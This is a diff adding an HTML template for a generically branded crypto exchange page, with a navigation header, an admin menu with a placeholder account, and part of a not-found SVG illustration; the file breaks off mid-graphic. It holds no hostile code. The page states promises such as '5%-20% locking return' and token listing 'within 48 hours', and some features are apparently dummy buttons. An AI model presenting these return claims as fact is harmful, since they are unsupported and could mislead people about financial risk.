@@ -1,0 +1,555 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title th:text="'Customer Support Chat | ' + ${site_domain}"></title>
+    <link rel="icon" th:href="${site_icon}">
+    <link rel="stylesheet" href="../assets/css/root.min.css?v=2">
+    <link rel="stylesheet" href="../assets/css/toastr.css">
+</head>
+<body>
+<header class="header">
+    <div class="header__wrapper">
+        <div class="header__logo" onclick="location.replace('../')">
+            <div class="header__logo-icon">
+                <img style="width: 30px; margin-bottom: -3px;" th:src="${site_icon}">
+            </div>
+            <th:block th:text="${site_name}"></th:block>
+        </div>
+        <div class="header__links">
+            <div class="header__links-wrapper">
+                <a class="header__link" href="../trading">
+                    Spot trading
+                </a>
+                <a class="header__link" href="../profile/swap">
+                    Swap
+                    <span class="header__link-new">0%</span>
+                </a>
+                <div class="header__link header__link-trade">
+                    <div class="header__link-wrapper">
+                        Derivatives
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link butafor__btn" href="#">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/futures.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Futures trading</div>
+                                <div class="header__more-description">
+                                    Perpetual or Quarterly Contracts settled in Crypto
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link butafor__btn" href="#">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/options.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Options trading</div>
+                                <div class="header__more-description">
+                                    Trade European-style Vanilla Options
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="header__link header__link-tools">
+                    <div class="header__link-wrapper">
+                        Tools
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="../market-crypto">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/cap.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Market cap</div>
+                                <div class="header__more-description">
+                                    Most of the available crypto assets and sorts them based on the market capitalization
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../market-screener">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/screener.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Market screener</div>
+                                <div class="header__more-description">
+                                    Powerful tool that allows to filter instruments based on fundamental data and various technical indicators
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../technical-analysis">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/tech.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Technical analysis</div>
+                                <div class="header__more-description">
+                                    Advanced tool that displays ratings based on technical indicators
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../cross-rates">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/rates.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Cross rates</div>
+                                <div class="header__more-description">
+                                    Real-time quotes of the selected currencies in comparison to the other major currencies at a glance
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../heat-map">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/heat.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Currency heat map</div>
+                                <div class="header__more-description">
+                                    Quick overview of action in the currency markets. It lets you spot strong and weak currencies in real-time and how strong they are in relation to one another
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <a class="header__link" href="../profile/staking">
+                    Staking
+                    <span class="header__link-hot">HOT</span>
+                </a>
+                <div class="header__link header__link-earn">
+                    <div class="header__link-wrapper">
+                        Earn
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="../profile/copy-trading">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/copy.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Copy trading</div>
+                                <div class="header__more-description">
+                                    Automate your trading by copying top traders strategies
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/trading-bots">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/bots.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Trading bots</div>
+                                <div class="header__more-description">
+                                    Intelligent pre-built trading bots help you auto-trade and earn all-day-long
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/launchpad">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/launchpad.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Launchpad</div>
+                                <div class="header__more-description">
+                                    Early easy access to new, high-quality crypto projects
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/space">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/space.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Space traveller</div>
+                                <div class="header__more-description">
+                                    Earn with your referral code
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/savings">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/savings.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Savings</div>
+                                <div class="header__more-description">
+                                    Value-added product for flexible returns
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/stake-eth20">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/eth20.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">ETH 2.0 Staking</div>
+                                <div class="header__more-description">
+                                    Don't just hold. Earn an additional 5%-20% locking return
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="header__link header__link-more">
+                    <div class="header__link-wrapper">
+                        More
+                        <div class="header__link-arrow">
+                            <svg width="11" height="8" viewbox="0 0 11 8" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1.34502 3.10642L4.95202 7.05416C5.49516 7.64861 6.37253 7.64861 6.91567 7.05416L10.5227 3.10642C11.4 2.14616 10.7733 0.5 9.53388 0.5H2.31989C1.08042 0.5 0.467644 2.14616 1.34502 3.10642Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header__more">
+                        <a class="header__more-link" href="../profile/p2p">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/p2p.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">P2P trading</div>
+                                <div class="header__more-description">
+                                    Buy crypto from verified merchants
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/buy-crypto">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/card.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Buy crypto with card</div>
+                                <div class="header__more-description">
+                                    Buy crypto via Card, Apple Pay, Google Pay
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/token-listing">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/tokenlist.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Token listing</div>
+                                <div class="header__more-description">
+                                    We can list your project on our exchange within 48 hours
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/institutions">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/inst.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name">Institutional home</div>
+                                <div class="header__more-description" th:text="${site_name} + ' offers the world`s most powerful suite of institutional crypto trading solutions'"></div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/cards">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/card.svg" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name" th:text="${site_name} + ' Card'"></div>
+                                <div class="header__more-description">
+                                    Order and ise your card anywhere Visa® debit cards are accepted, at 40M+ merchants worldwide.
+                                </div>
+                            </div>
+                        </a>
+                        <a class="header__more-link" href="../profile/ventures">
+                            <div class="header__more-img">
+                                <img src="../assets/img/header/ventures.png" alt="">
+                            </div>
+                            <div class="header__more-wrapper">
+                                <div class="header__more-name" th:text="${site_name} + ' Ventures'"></div>
+                                <div class="header__more-description" th:text="${site_name} + ' Ventures is a fund focused on exploring high-quality projects with great potential'"></div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="header__right" style="display: none">
+            <div class="header__user">
+                <div class="header__user-btn">
+                    <div class="header__user-name">Admin</div>
+                    <div class="header__user-img">
+                        <picture>
+                            <source srcset="../assets/img/profile/avatar.svg" type="image/webp">
+                            <img src="../assets/img/profile/avatar.svg" alt="">
+                        </picture>
+                    </div>
+                </div>
+                <div class="header-menu__bg">
+                    <div class="header-menu">
+                        <div class="header-menu__overview">
+                            <div class="header-menu__overview-info">
+                                <div class="header-menu__overview-img">
+                                    <img src="../assets/img/header/wallet-overview.svg" alt="">
+                                </div>
+                                <div class="header-menu__overview-wrapper">
+                                    <div class="header-menu__overview-title">
+                                        Assets overview
+                                    </div>
+                                    <div class="header-menu__overview-value">
+                                        <span>0</span> USD
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="header-menu__overview-links">
+                                <a class="header-menu__overview-link" href="deposit">
+                                    <img src="../assets/img/header/wallet-add.svg" alt="">
+                                    Deposit
+                                </a>
+                                <a class="header-menu__overview-link" href="withdraw">
+                                    <img src="../assets/img/header/withdraw.svg" alt="">
+                                    Withdraw
+                                </a>
+                            </div>
+                        </div>
+                        <div class="header-menu__links">
+                            <a style="color: orange;" class="header-menu__links-link" href="../admin-panel">
+                                <img src="../assets/img/header/admin.svg" alt="">
+                                Admin Panel
+                            </a>
+
+                            <a class="header-menu__links-link" href="../profile/wallet">
+                                <img src="../assets/img/header/wallet-menu.svg" alt="">
+                                Wallet
+                            </a>
+                            <a class="header-menu__links-link" href="settings">
+                                <img src="../assets/img/header/settings.svg" alt="">
+                                Account settings
+                            </a>
+                            <a class="header-menu__links-link" href="verification">
+                                <img src="../assets/img/header/verification.svg" alt="">
+                                Verification
+                            </a>
+                            <a class="header-menu__links-link" href="promo-codes">
+                                <img src="../assets/img/header/codes.svg" alt="">
+                                Gift codes
+                            </a>
+                            <a class="header-menu__links-link" href="support">
+                                <img src="../assets/img/header/support.svg" alt="">
+                                Support                                 </a>
+                        </div>
+                        <div class="header-menu__user">
+                            <div class="header-menu__user-container">
+                                <a class="header-menu__user-img" href="#">
+                                    <picture>
+                                        <source srcset="../assets/img/profile/avatar.svg" type="image/webp">
+                                        <img src="../assets/img/profile/avatar.svg" alt="">
+                                    </picture>
+                                </a>
+                                <div class="header-menu__user-wrapper">
+                                    <div class="header-menu__user-nickname">Admin</div>
+                                    <div class="header-menu__user-mail">admin@mail.ru</div>
+                                </div>
+                            </div>
+                            <div class="header-menu__user-exit" onclick="location.replace('../api/auth/logout')">
+                                <img src="../assets/img/header/exit.svg" alt="">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="header__btn-mobile">
+                <svg width="35" height="35" viewBox="0 0 100 100">
+                    <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
+                    <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
+                    <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
+                </svg>
+            </div>
+        </div>
+
+        <div class="header__right">
+            <div class="header__user">
+                <a class="header-menu__links-link" href="../profile/wallet" style="color: white; display: inline-block; border: 1px solid silver; border-radius: 5px; padding: 11px;">
+                    Profile
+                </a>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main class="main not-found" style="height: 70%">
+    <div class="not-found__content">
+        <svg width="400" height="264" viewBox="0 0 400 264" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M297.084 82.2876C334.747 120.19 376.788 155.696 372.727 187.703C368.746 219.645 318.503 248.088 270.41 258.843C222.237 269.534 176.215 262.536 129.475 247.634C82.8155 232.797 35.439 210.055 23.2565 177.66C11.1537 145.329 34.2447 103.28 68.4035 66.0251C102.562 28.835 147.789 -3.62526 186.964 0.326988C226.219 4.21445 259.422 44.4497 297.084 82.2876Z" fill="#F8F8F8"></path>
+            <path d="M198.799 185.401C156.744 185.401 122.623 194.306 122.623 205.15C122.623 216.083 156.744 224.988 198.799 224.988C236.27 224.988 267.481 217.934 273.829 208.677C274.622 207.531 274.975 206.385 274.975 205.238C274.975 194.306 240.855 185.401 198.799 185.401ZM198.799 207.972C174.553 207.972 154.98 205.062 154.98 201.447C154.98 201.447 154.98 201.359 154.98 201.183C154.98 201.095 154.98 201.095 155.068 201.006C155.068 201.006 155.068 200.918 155.157 200.918C156.832 197.568 175.788 194.923 198.799 194.923C221.017 194.923 239.356 197.392 242.177 200.566C242.442 200.83 242.53 201.095 242.53 201.359V201.447C242.618 205.062 222.957 207.972 198.799 207.972Z" fill="#7A97F4"></path>
+            <path d="M107.459 191.661H34.1044C32.2529 191.661 30.4014 192.278 28.9026 193.424L0.689239 215.554C-0.633261 216.612 0.0720767 218.728 1.74724 218.728H79.2457C81.1854 218.728 83.1251 217.934 84.5357 216.612L108.253 193.688C109.046 192.983 108.517 191.661 107.459 191.661Z" fill="#7A97F4"></path>
+            <path d="M398.496 191.661H325.054C323.202 191.661 321.351 192.278 319.852 193.424L291.638 215.554C290.316 216.612 291.021 218.728 292.696 218.728H370.195C372.135 218.728 374.074 217.934 375.485 216.612L399.202 193.688C400.083 192.983 399.554 191.661 398.496 191.661Z" fill="#7A97F4"></path>
+            <path d="M198.799 181.786C156.744 181.786 122.623 190.69 122.623 201.535C122.623 212.468 156.744 221.372 198.799 221.372C236.27 221.372 267.481 214.319 273.829 205.062C274.622 203.915 274.975 202.769 274.975 201.623C274.975 190.69 240.855 181.786 198.799 181.786ZM198.799 204.356C174.553 204.356 154.98 201.447 154.98 197.832C154.98 197.832 154.98 197.744 154.98 197.567C154.98 197.479 154.98 197.479 155.068 197.391C155.068 197.391 155.068 197.303 155.157 197.303C156.832 193.953 175.788 191.308 198.799 191.308C221.017 191.308 239.356 193.776 242.177 196.95C242.442 197.215 242.53 197.479 242.53 197.744V197.832C242.618 201.447 222.957 204.356 198.799 204.356Z" fill="#AD91FF"></path>
+            <path d="M273.829 205.062C267.481 214.319 236.358 221.373 198.799 221.373C156.744 221.373 122.623 212.468 122.623 201.535C122.623 201.535 135.848 217.493 196.154 217.493C247.996 217.581 268.892 207.795 273.829 205.062Z" fill="#6544C6"></path>
+            <path d="M242.177 196.95C239.267 193.776 220.929 191.308 198.799 191.308C175.699 191.308 156.831 193.953 155.156 197.303C155.95 195.363 161.24 188.663 198.799 188.663C233.36 188.663 240.678 194.658 242.177 196.95Z" fill="#6544C6"></path>
+            <path d="M108.076 191.661L92.6471 81.2759C92.4708 80.1297 91.5009 79.248 90.2666 79.248H69.4593C68.0486 79.248 66.9024 80.4824 67.0788 81.9812L72.2806 123.684C72.4569 125.359 71.2226 126.77 69.5474 126.77H45.7424C44.2436 126.77 43.0093 125.624 42.9211 124.125L40.9814 81.6285C40.8933 80.306 39.8353 79.3362 38.6009 79.3362H19.1161C17.7054 79.3362 16.6474 80.4824 16.7356 81.8049L19.3806 154.454C19.4688 156.747 21.4084 158.598 23.7008 158.598H76.6889L80.8328 191.837H108.076V191.661Z" fill="#273D7A"></path>
+            <path d="M399.113 191.661L383.684 81.2759C383.508 80.1297 382.538 79.248 381.303 79.248H360.496C359.085 79.248 357.939 80.4824 358.116 81.9812L363.317 123.684C363.494 125.359 362.259 126.77 360.584 126.77H336.779C335.28 126.77 334.046 125.624 333.958 124.125L332.018 81.6285C331.93 80.306 330.872 79.3362 329.638 79.3362H310.241C308.83 79.3362 307.772 80.4824 307.861 81.8049L310.506 154.454C310.594 156.747 312.533 158.598 314.826 158.598H367.814L371.958 191.837H399.113V191.661Z" fill="#273D7A"></path>
+            <path d="M92.0286 82.4221L80.3906 214.319C80.2143 216.788 78.0983 218.728 75.6296 218.728H58.1726C55.2631 218.728 53.0589 216.171 53.4116 213.35L60.7294 151.545L8.44661 152.426C5.53711 152.426 3.33294 149.87 3.86194 147.048L4.03828 145.902L16.0289 81.6286C16.3816 79.8653 17.8804 78.5428 19.7319 78.5428H36.3954C38.6878 78.5428 40.4511 80.6588 40.0984 82.9511L32.9569 123.508C32.6924 125.183 33.9268 126.594 35.6019 126.594H60.5531L66.3721 81.5404C66.6366 79.7771 68.1355 78.4546 69.8988 78.4546H88.5019C90.5298 78.5428 92.2049 80.3943 92.0286 82.4221Z" fill="#AD91FF"></path>
+            <path d="M61.0824 145.902L60.6416 151.545L8.35872 152.426C5.44922 152.426 3.24505 149.869 3.77405 147.048L3.95038 145.902H61.0824V145.902Z" fill="#6544C6"></path>
+            <path d="M92.0284 82.4223L80.3904 214.32C80.214 216.788 78.098 218.728 75.6294 218.728H72.9844L86.8265 78.543H88.5017C90.5295 78.543 92.2047 80.3945 92.0284 82.4223Z" fill="#6544C6"></path>
+            <path d="M32.8696 123.596C32.6051 125.271 33.8395 126.682 35.5146 126.682H30.401C28.5495 126.682 27.0507 125.007 27.4033 123.155L35.2502 78.6309H36.3963C38.6886 78.6309 40.452 80.7469 40.0993 83.0392L32.8696 123.596Z" fill="#6544C6"></path>
+            <path d="M382.98 82.4221L371.342 214.319C371.165 216.788 369.049 218.728 366.581 218.728H349.124C346.214 218.728 344.01 216.171 344.363 213.35L351.681 151.545L299.398 152.426C296.488 152.426 294.284 149.87 294.813 147.048L294.989 145.902L306.98 81.6286C307.333 79.8653 308.832 78.5428 310.683 78.5428H327.347C329.639 78.5428 331.402 80.6588 331.05 82.9511L323.908 123.508C323.644 125.183 324.878 126.594 326.553 126.594H351.504L357.323 81.5404C357.588 79.7771 359.087 78.4546 360.85 78.4546H379.453C381.569 78.5428 383.244 80.3943 382.98 82.4221Z" fill="#AD91FF"></path>
+            <path d="M352.121 145.902L351.681 151.545L299.398 152.426C296.488 152.426 294.284 149.869 294.813 147.048L294.989 145.902H352.121V145.902Z" fill="#6544C6"></path>
+            <path d="M382.98 82.4223L371.342 214.32C371.165 216.788 369.049 218.728 366.581 218.728H363.936L377.778 78.543H379.453C381.569 78.543 383.244 80.3945 382.98 82.4223Z" fill="#6544C6"></path>
+            <path d="M323.909 123.596C323.644 125.271 324.879 126.682 326.554 126.682H321.44C319.589 126.682 318.09 125.007 318.442 123.155L326.289 78.6309H327.435C329.728 78.6309 331.491 80.7469 331.138 83.0392L323.909 123.596Z" fill="#6544C6"></path>
+            <path opacity="0.28" d="M163.974 109.313L145.9 201.006C144.93 205.944 148.104 210.616 152.424 210.616H248.173C252.405 210.616 255.579 206.12 254.786 201.359L239.974 109.666C239.357 105.963 236.623 103.318 233.361 103.318H170.587C167.413 103.229 164.679 105.786 163.974 109.313Z" fill="#AD91FF"></path>
+            <path d="M245.617 115.044L254.345 144.051C254.521 144.668 255.139 145.02 255.756 144.756C256.197 144.58 256.549 144.051 256.373 143.522L250.642 113.809C250.289 112.222 248.526 111.341 247.027 111.958C245.881 112.487 245.264 113.721 245.617 115.044Z" fill="#FEC272"></path>
+            <path d="M229.129 125.535L234.771 147.93C234.86 148.37 235.3 148.547 235.653 148.459C236.006 148.371 236.182 148.018 236.094 147.665L232.479 124.83C232.303 123.772 231.157 123.067 230.099 123.507C229.393 123.86 228.952 124.654 229.129 125.535Z" fill="#FEC272"></path>
+            <path d="M155.599 117.865L148.281 140.171C148.193 140.612 147.664 140.789 147.311 140.612C146.958 140.436 146.782 140.083 146.87 139.731L152.16 116.895C152.425 115.837 153.659 115.22 154.629 115.661C155.51 116.102 155.863 116.984 155.599 117.865Z" fill="#FEC272"></path>
+            <path d="M170.146 124.742L160.624 166.18C160.536 166.621 160.095 166.797 159.743 166.709C159.39 166.621 159.214 166.268 159.302 165.916L166.796 124.037C166.972 122.979 168.118 122.273 169.176 122.714C169.97 122.979 170.411 123.86 170.146 124.742Z" fill="#FEC272"></path>
+            <path d="M190.337 129.591L185.752 159.656C185.664 160.097 185.223 160.361 184.871 160.185C184.518 160.097 184.342 159.744 184.342 159.391L186.81 129.062C186.987 128.004 188.045 127.299 189.103 127.651C189.984 127.828 190.513 128.709 190.337 129.591Z" fill="#FEC272"></path>
+            <path d="M213.964 128.974L215.11 176.672C215.11 177.113 214.758 177.377 214.317 177.377C213.964 177.289 213.7 177.025 213.7 176.672L210.438 128.974C210.438 127.828 211.407 127.034 212.465 127.211C213.347 127.387 213.964 128.18 213.964 128.974Z" fill="#FEC272"></path>
+            <path d="M122.359 85.6841C121.389 84.538 120.684 83.3918 120.155 82.2456L118.127 68.668L122.8 72.9881L122.359 85.6841Z" fill="#738DE0"></path>
+            <path d="M253.904 90.269C253.904 90.269 250.995 96.3525 244.647 103.141C236.712 111.605 223.31 121.216 203.385 121.216C189.366 121.216 178.963 116.543 171.557 110.9C159.919 102.083 155.334 90.798 155.334 90.798L253.904 90.269Z" fill="#273D7A"></path>
+            <path d="M253.904 90.269C253.904 90.269 250.995 96.3525 244.647 103.141C237.858 105.786 229.482 107.991 219.078 109.401C198.624 112.134 182.666 111.958 171.557 110.9C159.919 102.083 155.334 90.798 155.334 90.798L253.904 90.269Z" fill="#072359"></path>
+            <path d="M284.938 68.139C284.938 68.139 284.409 73.6935 282.646 80.5705C282.381 81.5403 281.941 82.6865 281.235 83.7445C279.384 86.7421 275.857 90.0043 270.126 93.0901C269.156 93.6191 268.01 94.1481 266.864 94.6771C265.982 95.118 265.101 95.4706 264.131 95.9115C262.808 96.4405 261.486 96.9695 260.075 97.4985C255.138 99.2618 249.319 100.761 242.442 102.171C241.913 102.259 241.472 102.348 240.943 102.436C239.621 102.7 238.034 102.877 236.358 103.053C229.305 103.846 219.959 104.375 209.997 104.552C208.145 104.552 206.294 104.64 204.442 104.64C195.008 104.728 185.486 104.464 177.199 104.023C175.435 103.935 173.672 103.846 172.085 103.67C167.236 103.317 163.004 102.788 159.918 102.171C155.421 101.29 151.366 100.32 147.751 99.2618C146.252 98.821 144.841 98.3801 143.431 97.9393C132.498 94.3245 125.886 89.9161 122.447 85.8605C121.918 85.2433 121.477 84.7143 121.125 84.0971C120.772 83.5681 120.419 82.951 120.243 82.422C119.978 81.8048 119.714 81.2758 119.626 80.6586C118.832 77.3965 118.215 74.0461 117.951 71.4893C117.598 68.5798 117.51 66.6401 117.51 66.6401L201.268 72.9L285.026 68.2271L284.938 68.139Z" fill="#99ADF9"></path>
+            <path d="M284.851 67.9627C284.851 68.5799 284.41 69.3734 283.616 70.3432C281.412 72.9001 276.122 76.6912 267.129 80.1297C265.983 80.5706 264.749 81.0114 263.426 81.4522C262.809 81.6286 262.192 81.8931 261.575 82.0694C260.252 82.5102 258.841 82.9511 257.343 83.3037C252.317 84.7144 246.498 86.0369 239.797 87.0067C238.21 87.2712 236.535 87.5357 234.772 87.7121C227.366 88.6819 219.078 89.2991 209.821 89.4754C208.057 89.4754 206.206 89.5636 204.354 89.5636H204.266C194.832 89.5636 186.104 89.1227 178.257 88.4174C176.494 88.2411 174.73 88.0647 173.055 87.8884C164.415 86.9186 156.744 85.5079 150.132 83.9209C148.633 83.5682 147.134 83.1274 145.724 82.7747C132.587 79.1599 123.946 74.6634 119.979 70.9604C119.185 70.2551 118.568 69.4616 118.127 68.8444C117.598 68.0509 117.334 67.3456 117.334 66.6402C117.334 60.3804 142.021 47.0672 204.707 47.0672C267.394 46.9791 284.851 63.6426 284.851 67.9627Z" fill="#273D7A"></path>
+            <path d="M168.559 54.2085L122.712 72.988C120.949 71.8419 118.48 69.3732 118.039 68.6679L167.06 53.415L168.559 54.2085Z" fill="#072359"></path>
+            <path d="M284.85 68.0509C284.85 68.5799 284.41 69.3734 283.616 70.3433L236.535 54.2088L238.034 53.5034L284.85 68.0509Z" fill="#072359"></path>
+            <path d="M176.318 59.0579L150.133 83.8327C148.634 83.4801 147.135 83.0392 145.725 82.6865L174.731 58.9697L176.318 59.0579Z" fill="#072359"></path>
+            <path d="M190.688 61.9676L178.257 88.4176C176.493 88.2412 174.73 88.0649 173.055 87.8886L189.101 61.8794L190.688 61.9676Z" fill="#072359"></path>
+            <path d="M239.886 87.0951C238.299 87.3596 236.536 87.6241 234.86 87.8004L222.693 61.9676L224.369 61.8794L239.886 87.0951Z" fill="#072359"></path>
+            <path d="M209.82 89.5633C208.057 89.5633 206.205 89.6515 204.354 89.6515H204.266L206.382 63.6424L208.057 63.5542L209.82 89.5633Z" fill="#072359"></path>
+            <path d="M267.04 80.1297C265.894 80.5706 264.66 81.0114 263.337 81.4522L231.686 59.0579L233.361 58.9697L267.04 80.1297Z" fill="#072359"></path>
+            <path d="M209.91 104.376C208.058 104.376 206.207 104.464 204.355 104.464V89.5637L209.822 89.4756L209.91 104.376Z" fill="#738DE0"></path>
+            <path d="M240.767 102.26C239.356 102.524 237.857 102.7 236.182 102.877L234.771 87.7122L239.797 87.0068L240.767 102.26Z" fill="#738DE0"></path>
+            <path d="M270.038 93.0022C269.068 93.5312 267.922 94.0602 266.776 94.5892L263.426 81.3642L267.041 80.1299L270.038 93.0022Z" fill="#738DE0"></path>
+            <path d="M178.258 88.4172L177.2 103.846C175.436 103.758 173.673 103.67 172.086 103.494L173.144 87.8882L178.258 88.4172Z" fill="#738DE0"></path>
+            <path d="M150.133 83.8327L147.664 99.0855C146.165 98.6447 144.754 98.2039 143.344 97.763L145.636 82.6865L150.133 83.8327Z" fill="#738DE0"></path>
+            <path d="M122.801 73.1647L121.037 84.0092C120.685 83.4802 120.332 82.863 120.156 82.334C119.891 81.7169 119.627 81.1879 119.538 80.5707C118.745 77.3085 118.128 73.9582 117.863 71.4014L118.128 68.7563C118.128 68.7563 119.627 70.5197 120.244 71.1368C120.773 71.6658 122.801 73.1647 122.801 73.1647Z" fill="#738DE0"></path>
+            <path d="M200.563 74.1341C226.517 74.1341 247.556 68.1736 247.556 60.821C247.556 53.4683 226.517 47.5078 200.563 47.5078C174.61 47.5078 153.57 53.4683 153.57 60.821C153.57 68.1736 174.61 74.1341 200.563 74.1341Z" fill="#072359"></path>
+            <path d="M243.501 58.7052C243.501 58.7052 240.062 62.5845 231.598 65.9348C225.339 68.4035 216.346 70.5195 204.002 70.5195C197.213 70.5195 191.306 69.9023 186.369 68.9325C169.882 65.7585 162.74 58.8815 162.74 58.8815C162.74 58.8815 166.355 32.0788 188.926 22.9977C193.51 21.1462 198.977 20 205.325 20C236.359 20 243.501 58.7052 243.501 58.7052Z" fill="#99ADF9"></path>
+            <path d="M186.369 68.9324C169.882 65.7584 162.74 58.8814 162.74 58.8814C162.74 58.8814 166.355 32.0787 188.926 22.9976C184.517 26.7006 180.197 34.1066 179.492 46.1854C178.787 55.1784 180.903 62.6726 186.369 68.9324Z" fill="#7A97F4"></path>
+            <path d="M243.502 58.7052C243.502 58.7052 240.063 62.5845 231.599 65.9348C230.277 60.9975 228.249 56.5892 228.249 56.5892C228.249 56.5892 219.961 58.3525 216.258 50.5057C212.555 42.6588 221.46 37.0162 221.46 37.0162C221.46 37.0162 219.344 30.2273 208.411 25.819C197.479 21.4107 188.75 22.9977 188.75 22.9977C193.335 21.1462 198.801 20 205.149 20C236.36 20 243.502 58.7052 243.502 58.7052Z" fill="#C2D1FF"></path>
+            <path d="M207.97 42.1296C209.285 42.1296 210.351 41.1033 210.351 39.8373C210.351 38.5712 209.285 37.5449 207.97 37.5449C206.656 37.5449 205.59 38.5712 205.59 39.8373C205.59 41.1033 206.656 42.1296 207.97 42.1296Z" fill="#C2D1FF"></path>
